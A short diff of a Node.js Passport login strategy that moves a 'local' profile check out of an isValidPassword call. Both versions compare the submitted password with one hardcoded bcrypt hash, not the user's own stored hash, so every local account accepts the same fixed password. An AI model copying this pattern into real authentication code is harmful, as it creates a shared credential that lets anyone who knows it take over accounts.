@@ -25,7 +25,7 @@ module.exports = function(passport) {
                 return done(null, false, {message: "USER_NOT_FOUND"});
             }
             
-            if (isValidPassword(user.profile === 'local' && {password: '$2a$10$NvlwfGfclU5qQxOZAewcjOHPXh1iJU0Nj3m7WW/vVfCBtMt2ghhsW'}, password)) {
+            if (user.profile === 'local' && isValidPassword({password: '$2a$10$NvlwfGfclU5qQxOZAewcjOHPXh1iJU0Nj3m7WW/vVfCBtMt2ghhsW'}, password)) {
                 return done(null, user, {});
             }
 
